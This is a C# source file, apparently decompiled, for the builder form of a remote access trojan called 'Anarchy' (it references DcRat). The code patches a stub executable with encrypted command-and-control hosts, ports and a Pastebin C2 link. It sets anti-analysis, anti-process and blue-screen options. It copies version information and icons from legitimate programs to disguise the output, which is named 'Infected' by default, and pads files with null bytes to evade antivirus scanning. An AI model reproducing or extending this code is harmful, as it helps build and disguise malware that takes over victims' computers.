using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using Anarchy.Helpers.Algorithm;
using Anarchy.Helpers.Helper;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Guna.UI2.WinForms;
using ReaLTaiizor.Controls;
using Siticone.UI.WinForms;
using Toolbelt.Drawing;
using Vestris.ResourceLib;
using Settings = Anarchy.Helpers.Settings;

namespace Anarchy.Forms;

public class FormBuilder : Form
{
    private string pumpby = "";

    private readonly Random random = new Random();

    private const string alphabet = "ΑΒΓΔΕΖΗΘΙωABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتي0123456789艾诶比西迪伊弗吉尺杰开勒斯吾贼德ץקרשת";

    private IContainer components;

    private DirectoryEntry directoryEntry1;

    private ToolTip toolTip1;

    private Label label17;

    private Label label16;

    private Label label5;

    private Label label3;

    private Label label4;

    private TextBox txtIcon;

    private PictureBox picIcon;

    private Label label14;

    private Label label13;

    private Label label12;

    private Label label11;

    private Label label10;

    private Label label9;

    private Label label7;

    private Label label8;

    private Label label2;

    private Label label1;

    private HopeTabPage hopeTabPage1;

    private System.Windows.Forms.TabPage tabPage1;

    private System.Windows.Forms.TabPage tabPage2;

    private PictureBox pictureBox1;

    private Guna2Panel guna2Panel2;

    private SiticoneControlBox siticoneControlBox4;

    private SiticoneControlBox siticoneControlBox3;

    internal Label Label22;

    private Guna2TextBox txtMutex;

    private Guna2TextBox txtGroup;

    private Guna2Button button1;

    private Label label6;

    private Guna2TextBox textFilename;

    private SiticoneOSToggleSwith checkBox1;

    private Guna2ComboBox comboBoxFolder;

    private Guna2TextBox textPort;

    private Guna2TextBox textIP;

    private SiticoneOSToggleSwith chkPaste_bin;

    private Label label15;

    private Guna2NumericUpDown numDelay;

    private SiticoneOSToggleSwith chkAnti;

    private Label label21;

    private SiticoneOSToggleSwith chkAntiProcess;

    private Label label20;

    private SiticoneOSToggleSwith chkBsod;

    private Label label19;

    private Guna2TextBox txtPaste_bin;

    private Guna2TextBox txtDescription;

    private Guna2TextBox txtCompany;

    private Guna2TextBox txtCopyright;

    private Guna2TextBox txtFileVersion;

    private Guna2TextBox txtProductVersion;

    private Guna2TextBox txtOriginalFilename;

    private Guna2TextBox txtTrademarks;

    private Guna2TextBox txtProduct;

    private Guna2Button btnIcon;

    private Guna2Button btnClone;

    private Label label24;

    private SiticoneOSToggleSwith chkIcon;

    private Label label23;

    private SiticoneOSToggleSwith btnAssembly;

    private Guna2DragControl guna2DragControl1;

    private Guna2Elipse guna2Elipse1;

    private Guna2Button btnAddIP;

    private Guna2ContextMenuStrip ipremove;

    private ToolStripMenuItem btnRemoveIP;

    private Guna2ContextMenuStrip RemovePort;

    private ToolStripMenuItem btnRemovePort;

    private System.Windows.Forms.TabPage Connection;

    private Guna2GroupBox guna2GroupBox1;

    private Label label18;

    private Label label25;

    private Guna2Button guna2Button1;

    private ListBox listBoxIP;

    private ListBox listBoxPort;

    private System.Windows.Forms.TabPage tabPage3;

    private Guna2PictureBox guna2PictureBox1;

    private Guna2GradientButton btnBuild;

    private System.Windows.Forms.TabPage tabPage4;

    private Guna2Button guna2Button2;

    private Guna2TextBox guna2TextBox1;

    private Label label26;

    private Guna2TextBox guna2TextBox2;

    private Guna2Button guna2Button3;

    private Label label30;

    private Guna2RadioButton guna2RadioButton3;

    private Guna2RadioButton guna2RadioButton2;

    private Guna2RadioButton guna2RadioButton1;

    public FormBuilder()
    {
        this.InitializeComponent();
    }

    private void SaveSettings()
    {
        try
        {
            List<string> list;
            list = new List<string>();
            foreach (string item in this.listBoxPort.Items)
            {
                list.Add(item);
            }
            Properties.Settings.Default.Ports = string.Join(",", list);
            List<string> list2;
            list2 = new List<string>();
            foreach (string item2 in this.listBoxIP.Items)
            {
                list2.Add(item2);
            }
            Properties.Settings.Default.IP = string.Join(",", list2);
            Properties.Settings.Default.Save();
        }
        catch
        {
        }
    }

    private void checkBox1_CheckedChanged(object sender, EventArgs e)
    {
        if (this.checkBox1.Checked)
        {
            this.checkBox1.Text = "ON";
            this.textFilename.Enabled = true;
            this.comboBoxFolder.Enabled = true;
        }
        else
        {
            this.checkBox1.Text = "OFF";
            this.textFilename.Enabled = false;
            this.comboBoxFolder.Enabled = false;
        }
    }

    private void Builder_Load(object sender, EventArgs e)
    {
        this.comboBoxFolder.SelectedIndex = 0;
        if (Properties.Settings.Default.IP.Length == 0)
        {
            this.listBoxIP.Items.Add("127.0.0.1");
        }
        if (Properties.Settings.Default.Paste_bin.Length == 0)
        {
            this.txtPaste_bin.Text = "https://pastebin.com/raw/UTPHT9Xx";
        }
        try
        {
            string[] array;
            array = Properties.Settings.Default.Ports.Split(new string[1] { "," }, StringSplitOptions.None);
            foreach (string text in array)
            {
                if (!string.IsNullOrWhiteSpace(text))
                {
                    this.listBoxPort.Items.Add(text.Trim());
                }
            }
        }
        catch
        {
        }
        try
        {
            string[] array;
            array = Properties.Settings.Default.IP.Split(new string[1] { "," }, StringSplitOptions.None);
            foreach (string text2 in array)
            {
                if (!string.IsNullOrWhiteSpace(text2))
                {
                    this.listBoxIP.Items.Add(text2.Trim());
                }
            }
        }
        catch
        {
        }
        if (Properties.Settings.Default.Mutex.Length == 0)
        {
            this.txtMutex.Text = this.getRandomCharacters();
        }
    }

    private void CheckBox2_CheckedChanged(object sender, EventArgs e)
    {
        if (this.chkPaste_bin.Checked)
        {
            this.txtPaste_bin.Enabled = true;
            this.textIP.Enabled = false;
            this.txtPaste_bin.Enabled = true;
            this.textPort.Enabled = false;
            this.listBoxIP.Enabled = false;
            this.listBoxPort.Enabled = false;
            this.btnAddIP.Enabled = false;
            this.guna2Button1.Enabled = false;
            this.btnRemoveIP.Enabled = false;
            this.btnRemovePort.Enabled = false;
        }
        else
        {
            this.textIP.Enabled = true;
            this.txtPaste_bin.Enabled = false;
            this.textPort.Enabled = true;
            this.listBoxIP.Enabled = true;
            this.listBoxPort.Enabled = true;
            this.btnAddIP.Enabled = true;
            this.guna2Button1.Enabled = true;
            this.btnRemoveIP.Enabled = true;
            this.btnRemovePort.Enabled = true;
        }
    }

    private void BtnRemovePort_Click(object sender, EventArgs e)
    {
        if (this.listBoxPort.SelectedItems.Count == 1)
        {
            this.listBoxPort.Items.Remove(this.listBoxPort.SelectedItem);
        }
    }

    private void BtnAddPort_Click(object sender, EventArgs e)
    {
        try
        {
            Convert.ToInt32(this.textPort.Text.Trim());
            foreach (string item in this.listBoxPort.Items)
            {
                if (item.Equals(this.textPort.Text.Trim()))
                {
                    return;
                }
            }
            this.listBoxPort.Items.Add(this.textPort.Text.Trim());
            this.textPort.Clear();
        }
        catch
        {
        }
    }

    private void BtnRemoveIP_Click(object sender, EventArgs e)
    {
        if (this.listBoxIP.SelectedItems.Count == 1)
        {
            this.listBoxIP.Items.Remove(this.listBoxIP.SelectedItem);
        }
    }

    private void BtnAddIP_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (string item in this.listBoxIP.Items)
            {
                this.textIP.Text = this.textIP.Text.Replace(" ", "");
                if (item.Equals(this.textIP.Text))
                {
                    return;
                }
            }
            this.listBoxIP.Items.Add(this.textIP.Text.Replace(" ", ""));
            this.textIP.Clear();
        }
        catch
        {
        }
        try
        {
            Convert.ToInt32(this.textPort.Text.Trim());
            foreach (string item2 in this.listBoxPort.Items)
            {
                if (item2.Equals(this.textPort.Text.Trim()))
                {
                    return;
                }
            }
            this.listBoxPort.Items.Add(this.textPort.Text.Trim());
            this.textPort.Clear();
        }
        catch
        {
        }
    }

    private async void BtnBuild_Click(object sender, EventArgs e)
    {
        if ((!this.chkPaste_bin.Checked && this.listBoxIP.Items.Count == 0) || this.listBoxPort.Items.Count == 0)
        {
            return;
        }
        if (this.checkBox1.Checked)
        {
            if (string.IsNullOrWhiteSpace(this.textFilename.Text) || string.IsNullOrWhiteSpace(this.comboBoxFolder.Text))
            {
                return;
            }
            if (!this.textFilename.Text.EndsWith("exe"))
            {
                this.textFilename.Text += ".exe";
            }
        }
        if (string.IsNullOrWhiteSpace(this.txtMutex.Text))
        {
            this.txtMutex.Text = this.getRandomCharacters();
        }
        if (this.chkPaste_bin.Checked && string.IsNullOrWhiteSpace(this.txtPaste_bin.Text))
        {
            return;
        }
        ModuleDefMD moduleDefMD;
        moduleDefMD = null;
        try
        {
            using (moduleDefMD = ModuleDefMD.Load("Stub/Stub.exe"))
            {
                using SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = ".exe (*.exe)|*.exe";
                saveFileDialog.InitialDirectory = Application.StartupPath;
                saveFileDialog.OverwritePrompt = false;
                saveFileDialog.FileName = "Infected";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    this.btnBuild.Enabled = false;
                    this.WriteSettings(moduleDefMD, saveFileDialog.FileName);
                    moduleDefMD.Write(saveFileDialog.FileName);
                    moduleDefMD.Dispose();
                    if (this.btnAssembly.Checked)
                    {
                        this.WriteAssembly(saveFileDialog.FileName);
                    }
                    if (this.chkIcon.Checked && !string.IsNullOrEmpty(this.txtIcon.Text))
                    {
                        IconInjector.InjectIcon(saveFileDialog.FileName, this.txtIcon.Text);
                    }
                    MessageBox.Show("Done!", "Anarchy Builder", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    this.SaveSettings();
                    base.Close();
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message, "Anarchy Builder", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            moduleDefMD?.Dispose();
            this.btnBuild.Enabled = true;
        }
    }

    private void WriteAssembly(string filename)
    {
        try
        {
            VersionResource versionResource;
            versionResource = new VersionResource();
            versionResource.LoadFrom(filename);
            versionResource.FileVersion = this.txtFileVersion.Text;
            versionResource.ProductVersion = this.txtProductVersion.Text;
            versionResource.Language = 0;
            StringFileInfo obj;
            obj = (StringFileInfo)versionResource["StringFileInfo"];
            obj["ProductName"] = this.txtProduct.Text;
            obj["FileDescription"] = this.txtDescription.Text;
            obj["CompanyName"] = this.txtCompany.Text;
            obj["LegalCopyright"] = this.txtCopyright.Text;
            obj["LegalTrademarks"] = this.txtTrademarks.Text;
            obj["Assembly Version"] = versionResource.ProductVersion;
            obj["InternalName"] = this.txtOriginalFilename.Text;
            obj["OriginalFilename"] = this.txtOriginalFilename.Text;
            obj["ProductVersion"] = versionResource.ProductVersion;
            obj["FileVersion"] = versionResource.FileVersion;
            versionResource.SaveTo(filename);
        }
        catch (Exception ex)
        {
            throw new ArgumentException("Assembly: " + ex.Message);
        }
    }

    private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
    {
        if (this.btnAssembly.Checked)
        {
            this.btnClone.Enabled = true;
            this.txtProduct.Enabled = true;
            this.txtDescription.Enabled = true;
            this.txtCompany.Enabled = true;
            this.txtCopyright.Enabled = true;
            this.txtTrademarks.Enabled = true;
            this.txtOriginalFilename.Enabled = true;
            this.txtOriginalFilename.Enabled = true;
            this.txtProductVersion.Enabled = true;
            this.txtFileVersion.Enabled = true;
        }
        else
        {
            this.btnClone.Enabled = false;
            this.txtProduct.Enabled = false;
            this.txtDescription.Enabled = false;
            this.txtCompany.Enabled = false;
            this.txtCopyright.Enabled = false;
            this.txtTrademarks.Enabled = false;
            this.txtOriginalFilename.Enabled = false;
            this.txtOriginalFilename.Enabled = false;
            this.txtProductVersion.Enabled = false;
            this.txtFileVersion.Enabled = false;
        }
    }

    private void ChkIcon_CheckedChanged(object sender, EventArgs e)
    {
        if (this.chkIcon.Checked)
        {
            this.txtIcon.Enabled = true;
            this.btnIcon.Enabled = true;
        }
        else
        {
            this.txtIcon.Enabled = false;
            this.btnIcon.Enabled = false;
        }
    }

    private void BtnIcon_Click(object sender, EventArgs e)
    {
        using OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Title = "Choose Icon";
        openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
        openFileDialog.Multiselect = false;
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
            {
                string imageLocation;
                imageLocation = this.GetIcon(openFileDialog.FileName);
                this.txtIcon.Text = imageLocation;
                this.picIcon.ImageLocation = imageLocation;
            }
            else
            {
                this.txtIcon.Text = openFileDialog.FileName;
                this.picIcon.ImageLocation = openFileDialog.FileName;
            }
        }
    }

    private string GetIcon(string path)
    {
        try
        {
            string text;
            text = Path.GetTempFileName() + ".ico";
            using (FileStream stream = new FileStream(text, FileMode.Create))
            {
                IconExtractor.Extract1stIconTo(path, stream);
            }
            return text;
        }
        catch
        {
        }
        return "";
    }

    private void WriteSettings(ModuleDefMD asmDef, string AsmName)
    {
        try
        {
            string randomString;
            randomString = Methods.GetRandomString(32);
            Aes256 aes;
            aes = new Aes256(randomString);
            X509Certificate2 x509Certificate;
            x509Certificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
            X509Certificate2 x509Certificate2;
            x509Certificate2 = new X509Certificate2(x509Certificate.Export(X509ContentType.Cert));
            byte[] inArray;
            using (RSACryptoServiceProvider rSACryptoServiceProvider = (RSACryptoServiceProvider)x509Certificate.PrivateKey)
            {
                inArray = rSACryptoServiceProvider.SignHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(randomString)), CryptoConfig.MapNameToOID("SHA256"));
            }
            foreach (TypeDef type in asmDef.Types)
            {
                asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
                asmDef.Name = Path.GetFileName(AsmName);
                if (!(type.Name == "Settings"))
                {
                    continue;
                }
                foreach (MethodDef method in type.Methods)
                {
                    if (method.Body == null)
                    {
                        continue;
                    }
                    for (int i = 0; i < method.Body.Instructions.Count(); i++)
                    {
                        if (method.Body.Instructions[i].OpCode != OpCodes.Ldstr)
                        {
                            continue;
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%Ports%")
                        {
                            if (this.chkPaste_bin.Enabled && this.chkPaste_bin.Checked)
                            {
                                method.Body.Instructions[i].Operand = aes.Encrypt("null");
                            }
                            else
                            {
                                List<string> list;
                                list = new List<string>();
                                foreach (string item in this.listBoxPort.Items)
                                {
                                    list.Add(item);
                                }
                                method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list));
                            }
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%Hosts%")
                        {
                            if (this.chkPaste_bin.Enabled && this.chkPaste_bin.Checked)
                            {
                                method.Body.Instructions[i].Operand = aes.Encrypt("null");
                            }
                            else
                            {
                                List<string> list2;
                                list2 = new List<string>();
                                foreach (string item2 in this.listBoxIP.Items)
                                {
                                    list2.Add(item2);
                                }
                                method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list2));
                            }
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%Install%")
                        {
                            method.Body.Instructions[i].Operand = aes.Encrypt(this.checkBox1.Checked.ToString().ToLower());
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%Folder%")
                        {
                            method.Body.Instructions[i].Operand = this.comboBoxFolder.Text;
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%File%")
                        {
                            method.Body.Instructions[i].Operand = this.textFilename.Text;
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
                        {
                            method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("DcRat ", ""));
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
                        {
                            method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString));
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
                        {
                            method.Body.Instructions[i].Operand = aes.Encrypt(this.txtMutex.Text);
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
                        {
                            method.Body.Instructions[i].Operand = aes.Encrypt(this.chkAnti.Checked.ToString().ToLower());
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%AntiProcess%")
                        {
                            method.Body.Instructions[i].Operand = aes.Encrypt(this.chkAntiProcess.Checked.ToString().ToLower());
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%Certificate%")
                        {
                            method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(x509Certificate2.Export(X509ContentType.Cert)));
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
                        {
                            method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(inArray));
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%BSOD%")
                        {
                            method.Body.Instructions[i].Operand = aes.Encrypt(this.chkBsod.Checked.ToString().ToLower());
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%Paste_bin%")
                        {
                            if (this.chkPaste_bin.Checked)
                            {
                                method.Body.Instructions[i].Operand = aes.Encrypt(this.txtPaste_bin.Text);
                            }
                            else
                            {
                                method.Body.Instructions[i].Operand = aes.Encrypt("null");
                            }
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%Delay%")
                        {
                            method.Body.Instructions[i].Operand = this.numDelay.Value.ToString();
                        }
                        if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
                        {
                            method.Body.Instructions[i].Operand = aes.Encrypt(this.txtGroup.Text);
                        }
                    }
                }
            }
        }
        catch (Exception ex)
        {
            throw new ArgumentException("WriteSettings: " + ex.Message);
        }
    }

    public string getRandomCharacters()
    {
        StringBuilder stringBuilder;
        stringBuilder = new StringBuilder();
        for (int i = 1; i <= new Random().Next(16, 25); i++)
        {
            stringBuilder.Append("ΑΒΓΔΕΖΗΘΙωABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتي0123456789艾诶比西迪伊弗吉尺杰开勒斯吾贼德ץקרשת"[this.random.Next(0, "ΑΒΓΔΕΖΗΘΙωABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتي0123456789艾诶比西迪伊弗吉尺杰开勒斯吾贼德ץקרשת".Length)]);
        }
        return stringBuilder.ToString();
    }

    private void BtnClone_Click(object sender, EventArgs e)
    {
        using OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Filter = "Executable (*.exe)|*.exe";
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            FileVersionInfo versionInfo;
            versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
            this.txtOriginalFilename.Text = versionInfo.InternalName ?? string.Empty;
            this.txtDescription.Text = versionInfo.FileDescription ?? string.Empty;
            this.txtCompany.Text = versionInfo.CompanyName ?? string.Empty;
            this.txtProduct.Text = versionInfo.ProductName ?? string.Empty;
            this.txtCopyright.Text = versionInfo.LegalCopyright ?? string.Empty;
            this.txtTrademarks.Text = versionInfo.LegalTrademarks ?? string.Empty;
            _ = versionInfo.FileMajorPart;
            this.txtFileVersion.Text = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
            this.txtProductVersion.Text = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
        }
    }

    private void tabPage1_Click(object sender, EventArgs e)
    {
    }

    private void txtMutex_TextChanged(object sender, EventArgs e)
    {
    }

    private void button1_Click(object sender, EventArgs e)
    {
        this.txtMutex.Clear();
        if (Properties.Settings.Default.Mutex.Length == 0)
        {
            this.txtMutex.Text = this.getRandomCharacters();
        }
    }

    private void tabPage2_Click(object sender, EventArgs e)
    {
    }

    private void guna2Button1_Click(object sender, EventArgs e)
    {
        try
        {
            Convert.ToInt32(this.textPort.Text.Trim());
            foreach (string item in this.listBoxPort.Items)
            {
                if (item.Equals(this.textPort.Text.Trim()))
                {
                    return;
                }
            }
            this.listBoxPort.Items.Add(this.textPort.Text.Trim());
            this.textPort.Clear();
        }
        catch
        {
        }
    }

    private void ipremove_Opening(object sender, CancelEventArgs e)
    {
    }

    public void Pump(string pumptype)
    {
        try
        {
            FileStream fileStream;
            fileStream = File.OpenWrite(this.guna2TextBox1.Text);
            long num;
            num = fileStream.Seek(0L, SeekOrigin.End);
            long num2;
            num2 = Convert.ToInt64(this.guna2TextBox2.Text);
            if (pumptype.Contains("kb"))
            {
                decimal num3;
                num3 = num2 * 1024L;
                while ((decimal)num < num3)
                {
                    num++;
                    fileStream.WriteByte(0);
                }
                fileStream.Close();
                MessageBox.Show("File Pumped");
            }
            else if (pumptype.Contains("mb"))
            {
                decimal num4;
                num4 = num2 * 1024L * 1024L;
                while ((decimal)num < num4)
                {
                    num++;
                    fileStream.WriteByte(0);
                }
                fileStream.Close();
                MessageBox.Show("File Pumped");
            }
            else
            {
                decimal num5;
                num5 = num2 * 1024L * 1024L * 1024L;
                while ((decimal)num < num5)
                {
                    num++;
                    fileStream.WriteByte(0);
                }
                fileStream.Close();
                MessageBox.Show("File Pumped");
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void guna2Button2_Click(object sender, EventArgs e)
    {
        OpenFileDialog openFileDialog;
        openFileDialog = new OpenFileDialog();
        openFileDialog.DefaultExt = "exe";
        openFileDialog.Filter = "exe files (*.exe)|*.exe";
        openFileDialog.FilterIndex = 1;
        openFileDialog.InitialDirectory = ".";
        openFileDialog.Title = "Select file to be pumped";
        if (openFileDialog.ShowDialog(this) == DialogResult.OK)
        {
            this.guna2TextBox1.Text = string.Empty;
            this.guna2TextBox1.Text = openFileDialog.FileName;
            new System.IO.FileInfo(this.guna2TextBox1.Text);
        }
    }

    private void Kbpump_CheckedChanged(object sender, EventArgs e)
    {
        if ((sender as System.Windows.Forms.RadioButton).Checked)
        {
            this.pumpby = "kb";
        }
    }

    private void MBpump_CheckedChanged(object sender, EventArgs e)
    {
        if ((sender as System.Windows.Forms.RadioButton).Checked)
        {
            this.pumpby = "mb";
        }
    }

    private void siticoneOSToggleSwith3_CheckedChanged(object sender, EventArgs e)
    {
        if ((sender as System.Windows.Forms.RadioButton).Checked)
        {
            this.pumpby = "gb";
        }
    }

    private void guna2Button3_Click(object sender, EventArgs e)
    {
        this.Pump(this.pumpby);
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && this.components != null)
        {
            this.components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormBuilder));
        this.directoryEntry1 = new System.DirectoryServices.DirectoryEntry();
        this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
        this.label17 = new System.Windows.Forms.Label();
        this.label16 = new System.Windows.Forms.Label();
        this.label5 = new System.Windows.Forms.Label();
        this.label3 = new System.Windows.Forms.Label();
        this.label4 = new System.Windows.Forms.Label();
        this.txtIcon = new System.Windows.Forms.TextBox();
        this.picIcon = new System.Windows.Forms.PictureBox();
        this.label14 = new System.Windows.Forms.Label();
        this.label13 = new System.Windows.Forms.Label();
        this.label12 = new System.Windows.Forms.Label();
        this.label11 = new System.Windows.Forms.Label();
        this.label10 = new System.Windows.Forms.Label();
        this.label9 = new System.Windows.Forms.Label();
        this.label7 = new System.Windows.Forms.Label();
        this.label8 = new System.Windows.Forms.Label();
        this.label2 = new System.Windows.Forms.Label();
        this.label1 = new System.Windows.Forms.Label();
        this.RemovePort = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
        this.btnRemovePort = new System.Windows.Forms.ToolStripMenuItem();
        this.hopeTabPage1 = new ReaLTaiizor.Controls.HopeTabPage();
        this.Connection = new System.Windows.Forms.TabPage();
        this.guna2GroupBox1 = new Guna.UI2.WinForms.Guna2GroupBox();
        this.listBoxIP = new System.Windows.Forms.ListBox();
        this.ipremove = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
        this.btnRemoveIP = new System.Windows.Forms.ToolStripMenuItem();
        this.listBoxPort = new System.Windows.Forms.ListBox();
        this.guna2Button1 = new Guna.UI2.WinForms.Guna2Button();
        this.label18 = new System.Windows.Forms.Label();
        this.label25 = new System.Windows.Forms.Label();
        this.chkPaste_bin = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
        this.label15 = new System.Windows.Forms.Label();
        this.txtPaste_bin = new Guna.UI2.WinForms.Guna2TextBox();
        this.textPort = new Guna.UI2.WinForms.Guna2TextBox();
        this.btnAddIP = new Guna.UI2.WinForms.Guna2Button();
        this.textIP = new Guna.UI2.WinForms.Guna2TextBox();
        this.tabPage1 = new System.Windows.Forms.TabPage();
        this.chkAnti = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
        this.label21 = new System.Windows.Forms.Label();
        this.chkAntiProcess = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
        this.label20 = new System.Windows.Forms.Label();
        this.chkBsod = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
        this.label19 = new System.Windows.Forms.Label();
        this.numDelay = new Guna.UI2.WinForms.Guna2NumericUpDown();
        this.comboBoxFolder = new Guna.UI2.WinForms.Guna2ComboBox();
        this.textFilename = new Guna.UI2.WinForms.Guna2TextBox();
        this.checkBox1 = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
        this.label6 = new System.Windows.Forms.Label();
        this.txtGroup = new Guna.UI2.WinForms.Guna2TextBox();
        this.button1 = new Guna.UI2.WinForms.Guna2Button();
        this.txtMutex = new Guna.UI2.WinForms.Guna2TextBox();
        this.tabPage2 = new System.Windows.Forms.TabPage();
        this.label24 = new System.Windows.Forms.Label();
        this.chkIcon = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
        this.label23 = new System.Windows.Forms.Label();
        this.btnAssembly = new Siticone.UI.WinForms.SiticoneOSToggleSwith();
        this.btnIcon = new Guna.UI2.WinForms.Guna2Button();
        this.btnClone = new Guna.UI2.WinForms.Guna2Button();
        this.txtDescription = new Guna.UI2.WinForms.Guna2TextBox();
        this.txtCompany = new Guna.UI2.WinForms.Guna2TextBox();
        this.txtCopyright = new Guna.UI2.WinForms.Guna2TextBox();
        this.txtFileVersion = new Guna.UI2.WinForms.Guna2TextBox();
        this.txtProductVersion = new Guna.UI2.WinForms.Guna2TextBox();
        this.txtOriginalFilename = new Guna.UI2.WinForms.Guna2TextBox();
        this.txtTrademarks = new Guna.UI2.WinForms.Guna2TextBox();
        this.txtProduct = new Guna.UI2.WinForms.Guna2TextBox();
        this.pictureBox1 = new System.Windows.Forms.PictureBox();
        this.tabPage4 = new System.Windows.Forms.TabPage();
        this.label30 = new System.Windows.Forms.Label();
        this.guna2Button3 = new Guna.UI2.WinForms.Guna2Button();
        this.label26 = new System.Windows.Forms.Label();
        this.guna2TextBox2 = new Guna.UI2.WinForms.Guna2TextBox();
        this.guna2Button2 = new Guna.UI2.WinForms.Guna2Button();
        this.guna2TextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
        this.tabPage3 = new System.Windows.Forms.TabPage();
        this.btnBuild = new Guna.UI2.WinForms.Guna2GradientButton();
        this.guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
        this.guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
        this.siticoneControlBox4 = new Siticone.UI.WinForms.SiticoneControlBox();
        this.siticoneControlBox3 = new Siticone.UI.WinForms.SiticoneControlBox();
        this.Label22 = new System.Windows.Forms.Label();
        this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
        this.guna2Elipse1 = new Guna.UI2.WinForms.Guna2Elipse(this.components);
        this.guna2RadioButton1 = new Guna.UI2.WinForms.Guna2RadioButton();
        this.guna2RadioButton2 = new Guna.UI2.WinForms.Guna2RadioButton();
        this.guna2RadioButton3 = new Guna.UI2.WinForms.Guna2RadioButton();
        ((System.ComponentModel.ISupportInitialize)this.picIcon).BeginInit();
        this.RemovePort.SuspendLayout();
        this.hopeTabPage1.SuspendLayout();
        this.Connection.SuspendLayout();
        this.guna2GroupBox1.SuspendLayout();
        this.ipremove.SuspendLayout();
        this.tabPage1.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.numDelay).BeginInit();
        this.tabPage2.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
        this.tabPage4.SuspendLayout();
        this.tabPage3.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.guna2PictureBox1).BeginInit();
        this.guna2Panel2.SuspendLayout();
        base.SuspendLayout();
        this.label17.AutoSize = true;
        this.label17.ForeColor = System.Drawing.Color.White;
        this.label17.Location = new System.Drawing.Point(11, 46);
        this.label17.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label17.Name = "label17";
        this.label17.Size = new System.Drawing.Size(54, 21);
        this.label17.TabIndex = 109;
        this.label17.Text = "Group";
        this.label16.AutoSize = true;
        this.label16.ForeColor = System.Drawing.Color.White;
        this.label16.Location = new System.Drawing.Point(13, 194);
        this.label16.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label16.Name = "label16";
        this.label16.Size = new System.Drawing.Size(72, 21);
        this.label16.TabIndex = 107;
        this.label16.Text = "Delay (S)";
        this.label5.AutoSize = true;
        this.label5.Font = new System.Drawing.Font("Roboto", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
        this.label5.ForeColor = System.Drawing.Color.White;
        this.label5.Location = new System.Drawing.Point(11, 10);
        this.label5.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
        this.label5.Name = "label5";
        this.label5.Size = new System.Drawing.Size(53, 19);
        this.label5.TabIndex = 103;
        this.label5.Text = "Mutex";
